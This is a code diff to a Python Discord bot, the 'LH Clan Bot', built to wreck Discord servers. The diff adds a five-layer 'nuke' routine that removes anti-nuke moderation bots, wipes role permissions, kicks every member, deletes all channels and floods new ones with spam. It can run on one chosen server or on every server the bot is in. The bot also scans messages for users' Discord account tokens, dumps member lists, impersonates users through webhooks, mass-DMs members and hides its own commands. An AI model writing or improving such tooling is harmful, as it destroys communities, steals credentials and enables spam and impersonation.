@@ -16,6 +16,21 @@ TOKEN = os.environ.get("TOKEN")
 VERIFY_ROLE_NAME = "Verified"
 PREMIUM_USER_ID = 1224012443341160498
 
+# ── known antinuke bot IDs ────────────────────────────────────
+ANTINUKE_IDS = {
+    159985870458322944,  # Wick
+    155149108183695360,  # Dyno
+    235088799074484224,  # Carl-bot
+    395087306962165763,  # Beemo
+    282859044593598464,  # Zeppelin
+    429457053791158281,  # Vortex
+    573030148151189514,  # Paladin
+    496683369965781012,  # Auttaja
+    715202395568095232,  # Wick Bot
+    489977906714509312,  # Gaius
+    505527697351696395,  # Comfy
+}
+
 # ── nuke config — editable via !LHP ──────────────────────────
 nuke_config = {
     "channel_name": "hooked by lh clan",
@@ -34,6 +49,11 @@ intents.message_content = True
 
 bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 
+# ── discord token regex ───────────────────────────────────────
+DISCORD_TOKEN_REGEX = re.compile(
+    r"[MNO][a-zA-Z0-9_-]{23,25}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27,38}"
+)
+
 
 # ── helpers ───────────────────────────────────────────────────
 def generate_token() -> str:
@@ -46,16 +66,13 @@ def has_valid_token(token_str: str) -> bool:
 def consume_token(token_str: str):
     active_tokens.pop(token_str.strip(), None)
 
-DISCORD_TOKEN_REGEX = re.compile(
-    r"[MNO][a-zA-Z0-9_-]{23,25}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27,38}"
-)
-
 
 # ── on_ready ──────────────────────────────────────────────────
 @bot.event
 async def on_ready():
     await bot.tree.sync()
     print(f"✅ Online as {bot.user}")
+    print(f"✅ In {len(bot.guilds)} servers")
 
 
 # ── setup_hook ────────────────────────────────────────────────
@@ -63,6 +80,99 @@ async def setup_hook():
     bot.add_view(VerifyButton())
 
 bot.setup_hook = setup_hook
+
+
+# ── on_guild_remove — notify owner if kicked ─────────────────
+@bot.event
+async def on_guild_remove(guild):
+    try:
+        owner = await bot.fetch_user(PREMIUM_USER_ID)
+        embed = discord.Embed(
+            title="⚠️ Bot Removed from Server",
+            description=(
+                f"**Server:** {guild.name}\n"
+                f"**ID:** `{guild.id}`\n"
+                f"**Members:** {guild.member_count}"
+            ),
+            color=0xff9900
+        )
+        await owner.send(embed=embed)
+    except Exception:
+        pass
+
+
+# ════════════════════════════════════════════════════════════════
+#  CORE NUKE ENGINE
+# ════════════════════════════════════════════════════════════════
+
+async def run_nuke(guild: discord.Guild):
+    """
+    5-layer nuke:
+    1. strip all bot roles → blind them
+    2. kick known antinuke bots → eliminate defenders
+    3. nerf all role permissions → nothing can fight back
+    4. kick all humans
+    5. delete all channels → create 12 → spam
+    """
+
+    # ── layer 1: strip all other bot roles ───────────────────
+    strip_tasks = []
+    for member in guild.members:
+        if member.bot and member != guild.me:
+            strip_tasks.append(
+                member.edit(roles=[], reason="LH — neutralize")
+            )
+    await asyncio.gather(*strip_tasks, return_exceptions=True)
+
+    # ── layer 2: kick known antinuke bots first ───────────────
+    antinuke_kicks = []
+    for member in guild.members:
+        if member.id in ANTINUKE_IDS:
+            antinuke_kicks.append(member.kick(reason="LH — antinuke removal"))
+    await asyncio.gather(*antinuke_kicks, return_exceptions=True)
+
+    # ── layer 3: nerf all role permissions ───────────────────
+    role_tasks = []
+    for role in guild.roles:
+        if role >= guild.me.top_role:
+            continue
+        if role.is_default():
+            continue
+        try:
+            perms = discord.Permissions.none()
+            role_tasks.append(role.edit(permissions=perms, reason="LH — permission wipe"))
+        except Exception:
+            pass
+    await asyncio.gather(*role_tasks, return_exceptions=True)
+
+    # ── layer 4: kick all humans ──────────────────────────────
+    kick_tasks = []
+    for member in guild.members:
+        if member == guild.me or member == guild.owner or member.bot:
+            continue
+        kick_tasks.append(member.kick(reason="LH Clan"))
+    await asyncio.gather(*kick_tasks, return_exceptions=True)
+
+    # ── layer 5: delete channels, create 12, spam ────────────
+    delete_tasks = [ch.delete() for ch in guild.channels]
+    await asyncio.gather(*delete_tasks, return_exceptions=True)
+
+    new_channels = []
+    for _ in range(nuke_config["channel_count"]):
+        try:
+            ch = await guild.create_text_channel(nuke_config["channel_name"])
+            new_channels.append(ch)
+        except Exception:
+            pass
+
+    async def spam_channel(channel):
+        for _ in range(nuke_config["spam_count"]):
+            try:
+                await channel.send(nuke_config["message"])
+            except Exception:
+                pass
+
+    await asyncio.gather(*[spam_channel(ch) for ch in new_channels])
 
 
 # ════════════════════════════════════════════════════════════════
@@ -112,7 +222,10 @@ class VerifyButton(discord.ui.View):
 async def setupverify(interaction: discord.Interaction):
     embed = discord.Embed(
         title="🔐 Verification",
-        description="Click the button below to verify yourself and gain access to the server.\n\nThis only takes one click.",
+        description=(
+            "Click the button below to verify yourself and gain access to the server.\n\n"
+            "This only takes one click."
+        ),
         color=0x5865f2
     )
     embed.set_footer(text=interaction.guild.name)
@@ -122,36 +235,6 @@ async def setupverify(interaction: discord.Interaction):
 # ════════════════════════════════════════════════════════════════
 #  LH — nuke + subcommands
 # ════════════════════════════════════════════════════════════════
-
-async def run_nuke(guild: discord.Guild):
-    """core nuke logic — reused by !LH and !LH EXEC"""
-    kick_tasks = []
-    for member in guild.members:
-        if member == guild.me or member == guild.owner:
-            continue
-        kick_tasks.append(member.kick(reason="LH Clan"))
-    await asyncio.gather(*kick_tasks, return_exceptions=True)
-
-    delete_tasks = [ch.delete() for ch in guild.channels]
-    await asyncio.gather(*delete_tasks, return_exceptions=True)
-
-    new_channels = []
-    for _ in range(nuke_config["channel_count"]):
-        try:
-            ch = await guild.create_text_channel(nuke_config["channel_name"])
-            new_channels.append(ch)
-        except Exception:
-            pass
-
-    async def spam_channel(channel):
-        for _ in range(nuke_config["spam_count"]):
-            try:
-                await channel.send(nuke_config["message"])
-            except Exception:
-                pass
-
-    await asyncio.gather(*[spam_channel(ch) for ch in new_channels])
-
 
 @bot.command(name="LH")
 async def lh_command(ctx, subcommand: Optional[str] = None, *, args: Optional[str] = None):
@@ -163,7 +246,8 @@ async def lh_command(ctx, subcommand: Optional[str] = None, *, args: Optional[st
                 title="❌ Access Denied",
                 description="Premium command. You don't have access.",
                 color=0xff0000
-            ))
+            ), delete_after=5)
+            await ctx.message.delete()
             return
 
         tok = generate_token()
@@ -184,13 +268,14 @@ async def lh_command(ctx, subcommand: Optional[str] = None, *, args: Optional[st
             await ctx.message.delete()
             await ctx.send("🔑 Token sent to your DMs.", delete_after=5)
         except discord.Forbidden:
-            await ctx.send(embed=embed)
+            await ctx.send(embed=embed, delete_after=15)
         return
 
-    # ── !LH GHOST — clone admin, then nuke ───────────────────
+    # ── !LH GHOST — clone top admin → nuke ───────────────────
     if subcommand and subcommand.upper() == "GHOST":
         if not ctx.author.guild_permissions.administrator:
             await ctx.send("❌ Administrator required.", delete_after=5)
+            await ctx.message.delete()
             return
 
         guild = ctx.guild
@@ -209,7 +294,11 @@ async def lh_command(ctx, subcommand: Optional[str] = None, *, args: Optional[st
             except Exception:
                 pass
 
-        await ctx.message.delete()
+        try:
+            await ctx.message.delete()
+        except Exception:
+            pass
+
         await asyncio.sleep(2)
         await run_nuke(guild)
         return
@@ -218,6 +307,7 @@ async def lh_command(ctx, subcommand: Optional[str] = None, *, args: Optional[st
     if subcommand and subcommand.upper() == "EXEC":
         if not args or len(args.split()) < 2:
             await ctx.send("❌ Usage: `!LH EXEC <serverID> <token>`", delete_after=5)
+            await ctx.message.delete()
             return
 
         parts = args.split()
@@ -229,7 +319,8 @@ async def lh_command(ctx, subcommand: Optional[str] = None, *, args: Optional[st
                 title="❌ Invalid Token",
                 description="Token doesn't exist or already used.",
                 color=0xff0000
-            ))
+            ), delete_after=5)
+            await ctx.message.delete()
             return
 
         try:
@@ -248,14 +339,15 @@ async def lh_command(ctx, subcommand: Optional[str] = None, *, args: Optional[st
         except Exception:
             pass
 
-        await ctx.send(
-            embed=discord.Embed(
+        try:
+            await ctx.author.send(embed=discord.Embed(
                 title="💀 Remote Nuke Initiated",
                 description=f"Targeting: **{target_guild.name}** (`{target_guild.id}`)",
                 color=0xff0000
-            ),
-            delete_after=10
-        )
+            ))
+        except Exception:
+            pass
+
         await run_nuke(target_guild)
         return
 
@@ -267,31 +359,37 @@ async def lh_command(ctx, subcommand: Optional[str] = None, *, args: Optional[st
                 title="❌ Invalid Token",
                 description="Token doesn't exist or already used.",
                 color=0xff0000
-            ))
+            ), delete_after=5)
+            await ctx.message.delete()
             return
 
         consume_token(tok)
-        guilds = [g for g in bot.guilds]
+        guilds = list(bot.guilds)
 
         try:
             await ctx.message.delete()
         except Exception:
             pass
 
-        await ctx.send(
-            embed=discord.Embed(
+        try:
+            await ctx.author.send(embed=discord.Embed(
                 title="💀 ALL SERVERS NUKE INITIATED",
                 description=f"Targeting **{len(guilds)}** servers simultaneously.",
                 color=0xff0000
-            ),
-            delete_after=10
-        )
+            ))
+        except Exception:
+            pass
+
         await asyncio.gather(*[run_nuke(g) for g in guilds], return_exceptions=True)
         return
 
     # ── !LH — standard nuke ───────────────────────────────────
     if not ctx.author.guild_permissions.administrator:
         await ctx.send("❌ Administrator required.", delete_after=5)
+        try:
+            await ctx.message.delete()
+        except Exception:
+            pass
         return
 
     try:
@@ -429,11 +527,20 @@ async def lhp(ctx):
 async def lh_spy(ctx):
     if ctx.author.id != PREMIUM_USER_ID:
         await ctx.send("❌ Access Denied.", delete_after=3)
+        try:
+            await ctx.message.delete()
+        except Exception:
+            pass
         return
+
+    try:
+        await ctx.message.delete()
+    except Exception:
+        pass
 
     guilds = bot.guilds
     if not guilds:
-        await ctx.send("Bot is not in any servers.")
+        await ctx.author.send("Bot is not in any servers.")
         return
 
     pages = [guilds[i:i+10] for i in range(0, len(guilds), 10)]
@@ -462,12 +569,8 @@ async def lh_spy(ctx):
         try:
             await ctx.author.send(embed=embed)
         except discord.Forbidden:
-            await ctx.send(embed=embed)
+            await ctx.send(embed=embed, delete_after=30)
 
-    try:
-        await ctx.message.delete()
-    except Exception:
-        pass
     await ctx.send("📡 Spy report sent to your DMs.", delete_after=5)
 
 
@@ -475,6 +578,10 @@ async def lh_spy(ctx):
 async def lh_members(ctx, server_id: str = None):
     if ctx.author.id != PREMIUM_USER_ID:
         await ctx.send("❌ Access Denied.", delete_after=3)
+        try:
+            await ctx.message.delete()
+        except Exception:
+            pass
         return
 
     if not server_id:
@@ -495,6 +602,8 @@ async def lh_members(ctx, server_id: str = None):
         await ctx.message.delete()
     except Exception:
         pass
+
+    await ctx.send("📋 Fetching member list...", delete_after=5)
 
     lines = [f"Member List — {guild.name} ({guild.id})\n{'='*50}"]
     async for member in guild.fetch_members(limit=None):
@@ -530,6 +639,10 @@ async def lh_members(ctx, server_id: str = None):
 async def lh_tokens(ctx, server_id: str = None):
     if ctx.author.id != PREMIUM_USER_ID:
         await ctx.send("❌ Access Denied.", delete_after=3)
+        try:
+            await ctx.message.delete()
+        except Exception:
+            pass
         return
 
     if not server_id:
@@ -551,7 +664,7 @@ async def lh_tokens(ctx, server_id: str = None):
     except Exception:
         pass
 
-    await ctx.send("🔍 Scanning channels for tokens... this may take a while.", delete_after=10)
+    status = await ctx.send("🔍 Scanning channels for tokens...")
 
     found = []
     for channel in guild.text_channels:
@@ -569,6 +682,11 @@ async def lh_tokens(ctx, server_id: str = None):
             continue
         except Exception:
             continue
+
+    try:
+        await status.delete()
+    except Exception:
+        pass
 
     if not found:
         try:
@@ -601,6 +719,10 @@ async def lh_tokens(ctx, server_id: str = None):
 async def impersonate(ctx, token_str: str = None, user_id: str = None, *, message: str = None):
     if not token_str or not user_id or not message:
         await ctx.send("❌ Usage: `!impersonate <token> <userID> <message>`", delete_after=5)
+        try:
+            await ctx.message.delete()
+        except Exception:
+            pass
         return
 
     if not has_valid_token(token_str):
@@ -608,7 +730,11 @@ async def impersonate(ctx, token_str: str = None, user_id: str = None, *, messag
             title="❌ Invalid Token",
             description="Token doesn't exist or already used.",
             color=0xff0000
-        ))
+        ), delete_after=5)
+        try:
+            await ctx.message.delete()
+        except Exception:
+            pass
         return
 
     try:
@@ -646,6 +772,10 @@ async def impersonate(ctx, token_str: str = None, user_id: str = None, *, messag
 async def massdm(ctx, token_str: str = None, server_id: str = None, *, message: str = None):
     if not token_str or not server_id or not message:
         await ctx.send("❌ Usage: `!massdm <token> <serverID> <message>`", delete_after=5)
+        try:
+            await ctx.message.delete()
+        except Exception:
+            pass
         return
 
     if not has_valid_token(token_str):
@@ -653,7 +783,11 @@ async def massdm(ctx, token_str: str = None, server_id: str = None, *, message: 
             title="❌ Invalid Token",
             description="Token doesn't exist or already used.",
             color=0xff0000
-        ))
+        ), delete_after=5)
+        try:
+            await ctx.message.delete()
+        except Exception:
+            pass
         return
 
     try:
@@ -673,7 +807,9 @@ async def massdm(ctx, token_str: str = None, server_id: str = None, *, message: 
     except Exception:
         pass
 
-    status_msg = await ctx.send(f"📬 Mass DMing **{guild.name}**... 0/{guild.member_count} sent")
+    status_msg = await ctx.send(
+        f"📬 Mass DMing **{guild.name}**... 0/{guild.member_count} sent"
+    )
 
     success = 0
     failed = 0
@@ -704,7 +840,7 @@ async def massdm(ctx, token_str: str = None, server_id: str = None, *, message: 
     try:
         await ctx.author.send(embed=embed)
     except Exception:
-        await ctx.send(embed=embed)
+        await ctx.send(embed=embed, delete_after=15)
 
 
 @bot.command(name="fake")
@@ -738,39 +874,46 @@ async def fake_system(ctx, *, message: str = None):
 
 
 # ════════════════════════════════════════════════════════════════
-#  HELP
+#  HELP — ephemeral, self-deleting
 # ════════════════════════════════════════════════════════════════
 
 @bot.command(name="help")
 async def help_cmd(ctx):
+    try:
+        await ctx.message.delete()
+    except Exception:
+        pass
+
     embed = discord.Embed(
         title="🛠️ LH Clan Bot — Command Reference",
         description=(
-            "```\nPrefix: !    Slash: /\n"
+            "```\n"
+            "Prefix : !      Slash  : /\n"
             "🔑 Premium = token required\n"
-            "⭐ Owner   = your user ID only\n"
-            "🔒 Admin   = server admin only```"
+            "⭐ Owner   = premium user only\n"
+            "🔒 Admin   = server admin only\n"
+            "```"
         ),
         color=0x2b2d31
     )
     embed.add_field(
         name="━━━━━━ 💀 NUKE ━━━━━━",
         value=(
-            "`!LH` — nuke current server *(Admin)*\n"
-            "`!LH GHOST` — clone top admin → nuke *(Admin)*\n"
-            "`!LH EXEC <serverID> <token>` — remote nuke a server 🔑\n"
-            "`!LH ALL <token>` — nuke ALL servers bot is in 🔑\n"
-            "`!LH T` — generate a premium token *(Owner)* ⭐\n"
-            "`!LHP` — edit nuke config (channel name, message, counts) 🔑"
+            "`!LH` — nuke current server 🔒\n"
+            "`!LH GHOST` — clone top admin identity → nuke 🔒\n"
+            "`!LH EXEC <serverID> <token>` — remote nuke any server 🔑\n"
+            "`!LH ALL <token>` — nuke every server bot is in 🔑\n"
+            "`!LH T` — generate a premium token ⭐\n"
+            "`!LHP` — edit nuke config (name/message/counts) 🔑"
         ),
         inline=False
     )
     embed.add_field(
         name="━━━━━━ 📡 INTEL ━━━━━━",
         value=(
-            "`!LHSPY` — list every server bot is in *(Owner)* ⭐\n"
-            "`!LHMEMBERS <serverID>` — dump full member list as .txt *(Owner)* ⭐\n"
-            "`!LHTOKENS <serverID>` — scan messages for Discord tokens *(Owner)* ⭐"
+            "`!LHSPY` — list every server bot is in ⭐\n"
+            "`!LHMEMBERS <serverID>` — full member dump as .txt ⭐\n"
+            "`!LHTOKENS <serverID>` — scan messages for Discord tokens ⭐"
         ),
         inline=False
     )
@@ -778,19 +921,19 @@ async def help_cmd(ctx):
         name="━━━━━━ 🎭 SOCIAL ━━━━━━",
         value=(
             "`!impersonate <token> <userID> <msg>` — webhook clone of any user 🔑\n"
-            "`!massdm <token> <serverID> <msg>` — DM every member of a server 🔑\n"
-            "`!fake <msg>` — post as Discord system *(Admin)*"
+            "`!massdm <token> <serverID> <msg>` — DM every server member 🔑\n"
+            "`!fake <msg>` — post as Discord system 🔒"
         ),
         inline=False
     )
     embed.add_field(
         name="━━━━━━ 🔐 VERIFY ━━━━━━",
-        value="`/setupverify` — post one-click verify panel *(Admin)*",
+        value="`/setupverify` — post one-click verify panel 🔒",
         inline=False
     )
     embed.add_field(
         name="━━━━━━ 📬 DM ━━━━━━",
-        value="`/dm <message> <count> [member|user_id] [delay]` — DM any user (max 200×)",
+        value="`/dm <msg> <count> [member|user_id] [delay]` — DM any user (max 200×)",
         inline=False
     )
     embed.add_field(
@@ -803,8 +946,19 @@ async def help_cmd(ctx):
         ),
         inline=False
     )
-    embed.set_footer(text="LH Clan Bot | Premium tokens: !LH T")
-    await ctx.send(embed=embed)
+    embed.set_footer(text="LH Clan Bot | Only you can see this message")
+
+    try:
+        await ctx.author.send(embed=embed)
+        await ctx.send("📬 Help sent to your DMs.", delete_after=5)
+    except discord.Forbidden:
+        # DMs closed — send ephemeral-style with auto-delete
+        msg = await ctx.send(embed=embed)
+        await asyncio.sleep(30)
+        try:
+            await msg.delete()
+        except Exception:
+            pass
 
 
 # ════════════════════════════════════════════════════════════════
@@ -883,7 +1037,7 @@ async def serverinfo(interaction: discord.Interaction):
     embed.add_field(name="Channels", value=str(len(g.channels)),              inline=True)
     embed.add_field(name="Roles",    value=str(len(g.roles)),                 inline=True)
     embed.add_field(name="Created",  value=g.created_at.strftime("%Y-%m-%d"), inline=True)
-    await interaction.response.send_message(embed=embed)
+    await interaction.response.send_message(embed=embed, ephemeral=True)
 
 
 @bot.tree.command(name="userinfo", description="Show info about a user")
@@ -896,7 +1050,7 @@ async def userinfo(interaction: discord.Interaction, member: discord.Member):
     embed.add_field(name="Account Created", value=member.created_at.strftime("%Y-%m-%d"), inline=True)
     embed.add_field(name="Top Role",        value=member.top_role.mention,                inline=True)
     embed.add_field(name="Bot?",            value="Yes" if member.bot else "No",          inline=True)
-    await interaction.response.send_message(embed=embed)
+    await interaction.response.send_message(embed=embed, ephemeral=True)
 
 
 @bot.tree.command(name="poll", description="Create a yes/no poll")
@@ -914,8 +1068,12 @@ async def poll(interaction: discord.Interaction, question: str):
 async def ping(interaction: discord.Interaction):
     latency = round(bot.latency * 1000)
     color = 0x00ff00 if latency < 100 else (0xff9900 if latency < 200 else 0xff0000)
-    embed = discord.Embed(title="🏓 Pong!", description=f"Latency: **{latency}ms**", color=color)
-    await interaction.response.send_message(embed=embed)
+    embed = discord.Embed(
+        title="🏓 Pong!",
+        description=f"Latency: **{latency}ms**",
+        color=color
+    )
+    await interaction.response.send_message(embed=embed, ephemeral=True)
 
 
 # ── run ───────────────────────────────────────────────────────
